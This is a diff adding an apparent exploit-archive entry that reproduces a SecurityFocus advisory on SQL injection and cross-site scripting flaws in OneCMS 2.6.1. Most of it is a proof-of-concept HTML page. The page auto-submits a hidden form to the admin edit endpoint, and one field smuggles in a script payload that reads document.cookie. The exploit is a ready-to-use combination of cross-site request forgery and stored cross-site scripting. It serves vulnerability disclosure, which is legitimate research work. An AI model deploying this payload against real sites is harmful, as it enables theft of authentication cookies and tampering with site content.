@@ -1,0 +1,23 @@
+source: http://www.securityfocus.com/bid/41194/info
+  
+OneCMS is prone to multiple SQL-injection and cross-site scripting vulnerabilities because it fails to sanitize user-supplied input.
+  
+Exploiting these issues could allow an attacker to steal cookie-based authentication credentials, control how the site is rendered to the user, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+  
+OneCMS 2.6.1 is vulnerable; prior versions may also be affected.
+
+<form action="http://www.example.com/admin/admin.php?view=manage&edit=2" method="post" name="main" >
+<input type="hidden" name="id[]" value="1" />
+<input type="hidden" name="cat_1" value="news" />
+<input type="hidden" name="name_1" value="OneCMS News title" />
+<input type="hidden" name="lev_1" value="No" />
+<input type="hidden" name="Full1" value="news full text" />
+<input type="hidden" name="systems1" value="" />
+<input type="hidden" name="games1" value="" />
+<input type="hidden" name="Short1" value='short"><script>alert(document.cookie)</script>' />
+<input type="hidden" name="image1" value="" />
+<input type="hidden" name="Add" value="Submit Changes" />
+</form>
+<script>
+document.main.submit();
+</script>
